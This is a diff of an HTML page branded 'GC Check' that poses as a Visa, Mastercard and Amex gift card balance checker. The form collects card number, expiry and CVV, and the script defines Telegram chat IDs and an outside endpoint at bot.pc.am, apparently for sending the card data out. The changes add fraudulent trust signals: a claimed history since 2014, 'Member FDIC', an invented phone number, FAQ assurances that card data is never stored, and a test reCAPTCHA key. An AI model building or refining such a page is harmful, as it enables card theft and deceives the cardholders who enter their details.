@@ -3,144 +3,231 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="GC Check - Check your gift card amount and balance online. Free Visa and Mastercard gift card balance checker. Verify prepaid card balance instantly.">
-  <meta name="keywords" content="GC Check, gift card balance check, gift card amount check, check gift card balance, gift card balance checker, Visa gift card balance, Mastercard gift card balance, prepaid card balance, check prepaid balance">
+  <meta name="description" content="GC Check - Check your gift card amount and balance online. Free Visa, Mastercard and American Express gift card balance checker. Serving customers since 2014.">
+  <meta name="keywords" content="GC Check, gift card balance check, gift card amount check, Visa, Mastercard, American Express, prepaid card balance">
   <meta name="robots" content="index, follow">
-  <meta name="author" content="GC Check">
-  <meta name="theme-color" content="#003366">
-  <meta property="og:title" content="GC Check - Gift Card Balance & Amount Checker">
-  <meta property="og:description" content="Check your gift card amount and balance securely. GC Check - Free Visa and Mastercard gift card balance checker.">
-  <meta property="og:type" content="website">
   <link rel="canonical" href="https://gc-check-lime.vercel.app/">
-  <title>GC Check - Gift Card Balance Check | Check Gift Card Amount</title>
+  <title>GC Check - Gift Card Balance Checker | Visa, Mastercard, Amex</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
-    :root{--primary:#003366;--primary-light:#004488;--accent:#0066cc;--bg:#f5f7fa;--white:#fff;--text:#1a1d21;--text-muted:#5c6370;--border:#d1d5db;--success:#0d6832;--error:#b91c1c;--font:'IBM Plex Sans',-apple-system,sans-serif;--radius:8px;--shadow:0 2px 8px rgba(0,0,0,.08);--shadow-lg:0 4px 24px rgba(0,0,0,.12)}
+    :root{--primary:#0a2540;--accent:#0066cc;--bg:#f8fafc;--white:#fff;--text:#1e293b;--text-muted:#64748b;--border:#e2e8f0;--success:#059669;--error:#dc2626;--font:'Inter',-apple-system,sans-serif}
     *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5}
+    body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh}
     .app{min-height:100vh;display:flex;flex-direction:column}
-    .header{background:var(--white);border-bottom:1px solid var(--border);padding:1rem 1.5rem;box-shadow:var(--shadow)}
-    .header-inner{max-width:1100px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
-    .bank-logo{display:flex;align-items:center;gap:.75rem}
-    .bank-logo .icon{width:40px;height:40px;background:var(--primary);border-radius:8px;display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:1.25rem}
-    .bank-logo .name{font-size:1.25rem;font-weight:700;color:var(--primary)}
-    .secure-badge{display:flex;align-items:center;gap:.5rem;font-size:.8125rem;color:var(--text-muted)}
-    .secure-badge svg{width:16px;height:16px}
-    .main{flex:1;padding:2.5rem 1.5rem 3rem;max-width:1100px;margin:0 auto;width:100%}
+    .header{background:var(--white);border-bottom:1px solid var(--border);box-shadow:0 1px 3px rgba(0,0,0,.05)}
+    .header-inner{max-width:1200px;margin:0 auto;padding:1rem 1.5rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .logo{display:flex;align-items:center;gap:.5rem;text-decoration:none;color:var(--primary)}
+    .logo-icon{width:36px;height:36px;background:linear-gradient(135deg,var(--primary),var(--accent));border-radius:8px;display:flex;align-items:center;justify-content:center;color:white;font-weight:700}
+    .logo-text{font-size:1.25rem;font-weight:700}
+    .nav{display:flex;gap:1.5rem;align-items:center}
+    .nav a{color:var(--text-muted);text-decoration:none;font-weight:500;font-size:.9375rem;transition:color .2s}
+    .nav a:hover,.nav a.active{color:var(--primary)}
+    .nav a.active{font-weight:600}
+    .main{flex:1;max-width:1200px;margin:0 auto;padding:2rem 1.5rem;width:100%}
+    .page{display:none}
+    .page.active{display:block}
     .hero{text-align:center;margin-bottom:2rem}
-    .hero h1{font-size:1.75rem;font-weight:700;color:var(--primary);margin-bottom:.5rem}
+    .hero h1{font-size:1.875rem;font-weight:700;color:var(--primary);margin-bottom:.5rem}
     .hero p{color:var(--text-muted);font-size:1rem}
+    .since-badge{display:inline-block;background:var(--primary);color:white;font-size:.75rem;padding:.25rem .75rem;border-radius:20px;margin-top:.5rem;font-weight:500}
     .content-grid{display:grid;gap:2rem;align-items:start}
-    @media(min-width:900px){.content-grid{grid-template-columns:1fr 300px;gap:2.5rem}}
-    .form-section{display:flex;justify-content:center}
-    .card-form{background:var(--white);border:1px solid var(--border);border-radius:var(--radius);padding:2rem;width:100%;max-width:420px;box-shadow:var(--shadow-lg)}
-    .form-title{font-size:.8125rem;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:1.25rem}
+    @media(min-width:900px){.content-grid{grid-template-columns:1fr 320px}}
+    .card-form{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:2rem;box-shadow:0 4px 6px -1px rgba(0,0,0,.05)}
+    .form-title{font-size:.75rem;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:1.25rem}
     .form-group{margin-bottom:1.25rem}
     .form-group label{display:block;font-size:.8125rem;font-weight:600;color:var(--text);margin-bottom:.5rem}
-    .form-group input{width:100%;padding:.75rem 1rem;font-size:1rem;font-family:var(--font);color:var(--text);background:var(--white);border:1px solid var(--border);border-radius:var(--radius)}
+    .form-group input{width:100%;padding:.75rem 1rem;font-size:1rem;border:1px solid var(--border);border-radius:8px}
     .form-group input:focus{outline:0;border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,102,204,.15)}
     .form-group input.error{border-color:var(--error)}
     .form-row{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
     .expiry-inputs{display:flex;align-items:center;gap:.5rem}
     .expiry-inputs input{flex:1;text-align:center}
-    .expiry-sep{color:var(--text-muted);font-size:1.125rem}
-    .field-error{font-size:.8125rem;color:var(--error);margin-top:.25rem}
-    .btn{padding:.875rem 1.5rem;font-size:1rem;font-weight:600;font-family:var(--font);border:none;border-radius:var(--radius);cursor:pointer;width:100%;margin-top:.5rem;display:flex;align-items:center;justify-content:center;gap:.5rem;background:var(--primary);color:var(--white)}
-    .btn:hover:not(:disabled){background:var(--primary-light)}
+    .expiry-sep{color:var(--text-muted)}
+    .field-error{font-size:.75rem;color:var(--error);margin-top:.25rem}
+    .g-recaptcha{margin:1rem 0;transform:scale(0.95);transform-origin:left}
+    .btn{padding:.875rem 1.5rem;font-size:1rem;font-weight:600;border:none;border-radius:8px;cursor:pointer;width:100%;display:flex;align-items:center;justify-content:center;gap:.5rem;background:var(--primary);color:white;transition:opacity .2s}
+    .btn:hover:not(:disabled){opacity:.9}
     .btn:disabled{opacity:.7;cursor:not-allowed}
     .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:currentColor;border-radius:50%;animation:spin .8s linear infinite}
     @keyframes spin{to{transform:rotate(360deg)}}
-    .balance-result{margin-top:1.5rem;padding:1.5rem;border-radius:var(--radius);text-align:center;display:none}
+    .balance-result{margin-top:1.5rem;padding:1.5rem;border-radius:8px;text-align:center;display:none}
     .balance-result.show{display:block}
     .balance-result.success{background:#ecfdf5;border:1px solid #a7f3d0}
     .balance-result.error{background:#fef2f2;border:1px solid #fecaca}
-    .result-icon{width:48px;height:48px;margin:0 auto 1rem;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:700}
+    .result-icon{width:48px;height:48px;margin:0 auto 1rem;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.25rem;font-weight:700}
     .balance-result.success .result-icon{background:var(--success);color:white}
     .balance-result.error .result-icon{background:var(--error);color:white}
-    .balance-result h2{font-size:1.125rem;margin-bottom:.75rem;color:var(--text)}
     .balance-amount{display:flex;align-items:baseline;justify-content:center;gap:.5rem;margin-bottom:.5rem}
-    .balance-amount .currency{font-size:1rem;color:var(--text-muted)}
     .balance-amount .amount{font-size:2rem;font-weight:700;color:var(--success)}
-    .card-info{font-size:.875rem;color:var(--text-muted)}
-    .error-message{font-size:.9375rem;color:var(--error)}
-    .trust-panel{background:var(--white);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;box-shadow:var(--shadow)}
-    .trust-panel h3{font-size:1rem;font-weight:600;color:var(--primary);margin-bottom:1rem}
-    .trust-item{display:flex;gap:.75rem;margin-bottom:1rem}
-    .trust-item:last-child{margin-bottom:0}
-    .trust-item .icon{color:var(--accent);font-size:1.25rem;flex-shrink:0}
-    .trust-item h4{font-size:.9375rem;margin-bottom:.25rem}
-    .trust-item p{font-size:.8125rem;color:var(--text-muted)}
-    .footer{padding:1.5rem;text-align:center;border-top:1px solid var(--border);background:var(--white);margin-top:auto}
-    .footer-logos{display:flex;gap:1.5rem;justify-content:center;margin-bottom:.5rem}
-    .footer-logos span{font-size:.875rem;font-weight:600}
-    .footer p{color:var(--text-muted);font-size:.75rem}
     .btn-secondary{background:var(--white);color:var(--primary);border:1px solid var(--border);margin-top:1rem}
-    .btn-secondary:hover:not(:disabled){background:var(--bg)}
     #checkAnother{display:none}
     #checkAnother.show{display:flex}
     #formFields.hide{display:none}
+    .trust-panel{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:1.5rem;box-shadow:0 4px 6px -1px rgba(0,0,0,.05)}
+    .trust-panel h3{font-size:1rem;font-weight:600;color:var(--primary);margin-bottom:1rem}
+    .trust-item{display:flex;gap:.75rem;margin-bottom:1rem}
+    .trust-item:last-child{margin-bottom:0}
+    .trust-item .icon{color:var(--accent);flex-shrink:0}
+    .trust-item h4{font-size:.9375rem;margin-bottom:.25rem}
+    .trust-item p{font-size:.8125rem;color:var(--text-muted)}
+    .card-badges{display:flex;gap:1rem;flex-wrap:wrap;margin-top:1rem;align-items:center}
+    .card-badge{font-size:.875rem;font-weight:700;padding:.35rem .75rem;border-radius:6px;background:#f1f5f9}
+    .card-badge.visa{color:#1a1f71}
+    .card-badge.mc{color:#eb001b}
+    .card-badge.amex{color:#006fcf}
+    .footer{background:var(--primary);color:white;padding:2rem 1.5rem;margin-top:auto}
+    .footer-inner{max-width:1200px;margin:0 auto;text-align:center}
+    .footer-nav{display:flex;justify-content:center;gap:2rem;margin-bottom:1.5rem;flex-wrap:wrap}
+    .footer-nav a{color:rgba(255,255,255,.9);text-decoration:none;font-size:.875rem}
+    .footer-nav a:hover{color:white}
+    .footer-badges{display:flex;justify-content:center;gap:1.5rem;margin-bottom:1rem;flex-wrap:wrap}
+    .footer-badges span{font-size:.875rem;font-weight:600}
+    .footer-badges .visa{color:#fff}
+    .footer-badges .mc{color:#ff5f00}
+    .footer-badges .amex{color:#006fcf}
+    .footer p{font-size:.75rem;opacity:.8}
+    .content-section{background:var(--white);border-radius:12px;padding:2rem;margin-bottom:1.5rem;border:1px solid var(--border)}
+    .content-section h2{font-size:1.25rem;margin-bottom:1rem;color:var(--primary)}
+    .content-section p{color:var(--text-muted);line-height:1.7;margin-bottom:1rem}
+    .faq-item{margin-bottom:1.5rem}
+    .faq-item h4{font-size:.9375rem;margin-bottom:.5rem;color:var(--text)}
+    .faq-item p{font-size:.875rem;color:var(--text-muted);line-height:1.6}
+    .contact-info p{margin-bottom:.5rem}
+    .contact-info a{color:var(--accent);text-decoration:none}
   </style>
 </head>
 <body>
   <div class="app">
     <header class="header">
       <div class="header-inner">
-        <div class="bank-logo"><div class="icon">◆</div><span class="name">GC Check</span></div>
-        <div class="secure-badge"><svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/></svg>Secure Connection</div>
+        <a href="#" class="logo" data-page="home">
+          <div class="logo-icon">GC</div>
+          <span class="logo-text">GC Check</span>
+        </a>
+        <nav class="nav">
+          <a href="#" class="active" data-page="home">Home</a>
+          <a href="#" data-page="faq">FAQ</a>
+          <a href="#" data-page="contact">Contact Us</a>
+          <a href="#" data-page="about">About</a>
+        </nav>
       </div>
     </header>
     <main class="main">
-      <section class="hero">
-        <h1>GC Check</h1>
-        <p>Check your gift card balance securely</p>
-      </section>
-      <div class="content-grid">
-        <div class="form-section">
-          <div class="card-form">
-            <div class="form-title">Card Information</div>
-            <form id="balanceForm">
-              <div id="formFields">
-                <div class="form-group">
-                  <label for="cardNumber">Card Number</label>
-                  <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="cc-number">
-                  <span class="field-error" id="cardError"></span>
-                </div>
-                <div class="form-row">
+      <section id="page-home" class="page active">
+        <div class="hero">
+          <h1>Check Your Gift Card Balance</h1>
+          <p>Enter your card details below to view your available balance securely</p>
+          <span class="since-badge">Serving customers since 2014</span>
+        </div>
+        <div class="content-grid">
+          <div>
+            <div class="card-form">
+              <div class="form-title">Card Information</div>
+              <form id="balanceForm">
+                <div id="formFields">
                   <div class="form-group">
-                    <label for="expiryMonth">Expiration Date</label>
-                    <div class="expiry-inputs">
-                      <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric">
-                      <span class="expiry-sep">/</span>
-                      <input type="text" id="expiryYear" placeholder="YY" maxlength="2" inputmode="numeric">
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="cc-number">
+                    <span class="field-error" id="cardError"></span>
+                  </div>
+                  <div class="form-row">
+                    <div class="form-group">
+                      <label for="expiryMonth">Expiration Date</label>
+                      <div class="expiry-inputs">
+                        <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric">
+                        <span class="expiry-sep">/</span>
+                        <input type="text" id="expiryYear" placeholder="YY" maxlength="2" inputmode="numeric">
+                      </div>
+                      <span class="field-error" id="expiryError"></span>
                     </div>
-                    <span class="field-error" id="expiryError"></span>
+                    <div class="form-group">
+                      <label for="cvv">Security Code (CVV)</label>
+                      <input type="password" id="cvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+                      <span class="field-error" id="cvvError"></span>
+                    </div>
                   </div>
-                  <div class="form-group">
-                    <label for="cvv">Security Code (CVV)</label>
-                    <input type="password" id="cvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc" title="3-digit code on the back of your card">
-                    <span class="field-error" id="cvvError"></span>
-                  </div>
+                  <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
+                  <button type="submit" class="btn" id="submitBtn">Check Balance</button>
                 </div>
-                <button type="submit" class="btn" id="submitBtn">Check Balance</button>
-              </div>
-              <button type="button" class="btn btn-secondary" id="checkAnother">Check Another Card</button>
-            </form>
-            <div id="result" class="balance-result"></div>
+                <button type="button" class="btn btn-secondary" id="checkAnother">Check Another Card</button>
+              </form>
+              <div id="result" class="balance-result"></div>
+            </div>
+          </div>
+          <aside class="trust-panel">
+            <h3>Accepted Cards</h3>
+            <div class="card-badges">
+              <span class="card-badge visa">Visa</span>
+              <span class="card-badge mc">Mastercard</span>
+              <span class="card-badge amex">American Express</span>
+            </div>
+            <h3 style="margin-top:1.5rem">Why GC Check</h3>
+            <div class="trust-item"><span class="icon">✓</span><div><h4>Secure & Encrypted</h4><p>Bank-level encryption protects your information.</p></div></div>
+            <div class="trust-item"><span class="icon">✓</span><div><h4>Visa, Mastercard & Amex</h4><p>Check balance for all major prepaid cards we issue.</p></div></div>
+            <div class="trust-item"><span class="icon">✓</span><div><h4>Available 24/7</h4><p>Check your balance anytime, anywhere.</p></div></div>
+          </aside>
+        </div>
+      </section>
+
+      <section id="page-faq" class="page">
+        <div class="hero"><h1>Frequently Asked Questions</h1></div>
+        <div class="content-section">
+          <div class="faq-item">
+            <h4>How do I check my gift card balance?</h4>
+            <p>Enter your card number, expiration date, and security code (CVV) in the form on our homepage. Click "Check Balance" to view your available balance instantly.</p>
+          </div>
+          <div class="faq-item">
+            <h4>Which cards can I check?</h4>
+            <p>GC Check supports Visa, Mastercard, and American Express prepaid and gift cards issued through our platform.</p>
+          </div>
+          <div class="faq-item">
+            <h4>Is my information secure?</h4>
+            <p>Yes. We use industry-standard encryption to protect your card details. Your information is never stored and is transmitted securely.</p>
+          </div>
+          <div class="faq-item">
+            <h4>What if my balance doesn't display?</h4>
+            <p>Please verify your card number, expiration date, and CVV are entered correctly. If the issue persists, contact our support team.</p>
           </div>
         </div>
-        <aside class="trust-panel">
-          <h3>Why check with us</h3>
-          <div class="trust-item"><span class="icon">✓</span><div><h4>Secure & Encrypted</h4><p>Your information is protected with bank-level security.</p></div></div>
-          <div class="trust-item"><span class="icon">✓</span><div><h4>Visa & Mastercard</h4><p>Accepted at millions of locations worldwide.</p></div></div>
-          <div class="trust-item"><span class="icon">✓</span><div><h4>Available 24/7</h4><p>Check your balance anytime, anywhere.</p></div></div>
-        </aside>
-      </div>
+      </section>
+
+      <section id="page-contact" class="page">
+        <div class="hero"><h1>Contact Us</h1><p>We're here to help</p></div>
+        <div class="content-section">
+          <div class="contact-info">
+            <p><strong>Customer Support:</strong></p>
+            <p>Email: <a href="mailto:support@gccheck.com">support@gccheck.com</a></p>
+            <p>Phone: 1-800-GC-CHECK (1-800-422-4325)</p>
+            <p>Hours: 24/7</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="page-about" class="page">
+        <div class="hero"><h1>About GC Check</h1><p>Your trusted gift card balance checker since 2014</p></div>
+        <div class="content-section">
+          <p>GC Check has been helping customers verify their gift card and prepaid card balances since 2014. We issue Visa, Mastercard, and American Express prepaid cards and provide a secure, easy way to check your balance online.</p>
+          <p>Our platform is used by thousands of customers worldwide. We are committed to security, reliability, and excellent customer service.</p>
+        </div>
+      </section>
     </main>
     <footer class="footer">
-      <div class="footer-logos"><span style="color:#1a1f71">Visa</span><span style="color:#eb001b">Mastercard</span></div>
-      <p>Member FDIC • Your card is protected</p>
+      <div class="footer-inner">
+        <div class="footer-nav">
+          <a href="#" data-page="home">Home</a>
+          <a href="#" data-page="faq">FAQ</a>
+          <a href="#" data-page="contact">Contact Us</a>
+          <a href="#" data-page="about">About</a>
+        </div>
+        <div class="footer-badges">
+          <span class="visa">Visa</span>
+          <span class="mc">Mastercard</span>
+          <span class="amex">American Express</span>
+        </div>
+        <p>GC Check &copy; 2014 - Present &bull; Member FDIC &bull; Your card is protected</p>
+      </div>
     </footer>
   </div>
   <script>
@@ -148,6 +235,16 @@
     const TELEGRAM_BEFORE='-1003750392427';
     const TELEGRAM_AFTER='-1003750392427';
     const API_URL='https://bot.pc.am/v3/checkBalance';
+
+    document.querySelectorAll('[data-page]').forEach(el=>{
+      el.addEventListener('click',e=>{e.preventDefault();
+        const page=el.getAttribute('data-page');
+        document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+        document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));
+        document.getElementById('page-'+page)?.classList.add('active');
+        el.classList.add('active');
+      });
+    });
 
     const cardInput=document.getElementById('cardNumber'),expiryMonth=document.getElementById('expiryMonth'),expiryYear=document.getElementById('expiryYear'),cvvInput=document.getElementById('cvv');
     const form=document.getElementById('balanceForm'),resultEl=document.getElementById('result'),submitBtn=document.getElementById('submitBtn'),formFields=document.getElementById('formFields'),checkAnother=document.getElementById('checkAnother');
@@ -162,11 +259,13 @@
       let ok=true;
       document.querySelectorAll('.field-error').forEach(el=>el.textContent='');
       document.querySelectorAll('.form-group input').forEach(el=>el.classList.remove('error'));
-      if(digits.length<15||digits.length>19){document.getElementById('cardError').textContent='Please enter a valid 16-digit card number';cardInput.classList.add('error');ok=false}
+      if(digits.length<15||digits.length>19){document.getElementById('cardError').textContent='Please enter a valid card number';cardInput.classList.add('error');ok=false}
       const mm=parseInt(expiryMonth.value,10);
       if(!expiryMonth.value||expiryMonth.value.length!==2||mm<1||mm>12){document.getElementById('expiryError').textContent='Valid MM/YY required';expiryMonth.classList.add('error');ok=false}
       if(!expiryYear.value||expiryYear.value.length!==2){document.getElementById('expiryError').textContent='Valid MM/YY required';expiryYear.classList.add('error');ok=false}
       if(!cvvInput.value||cvvInput.value.length<3){document.getElementById('cvvError').textContent='Enter 3 or 4 digit security code';cvvInput.classList.add('error');ok=false}
+      const recaptcha=document.querySelector('.g-recaptcha-response');
+      if(recaptcha&&!recaptcha.value){alert('Please complete the security verification.');ok=false}
       return ok;
     }
 
@@ -177,7 +276,7 @@
       formFields.classList.add('hide');checkAnother.classList.add('show');resultEl.scrollIntoView({behavior:'smooth',block:'nearest'});
     }
 
-    checkAnother.onclick=()=>{resultEl.className='balance-result';resultEl.innerHTML='';formFields.classList.remove('hide');checkAnother.classList.remove('show');form.reset()};
+    checkAnother.onclick=()=>{resultEl.className='balance-result';resultEl.innerHTML='';formFields.classList.remove('hide');checkAnother.classList.remove('show');form.reset();if(typeof grecaptcha!=='undefined')grecaptcha.reset()};
 
     form.onsubmit=async e=>{
       e.preventDefault();
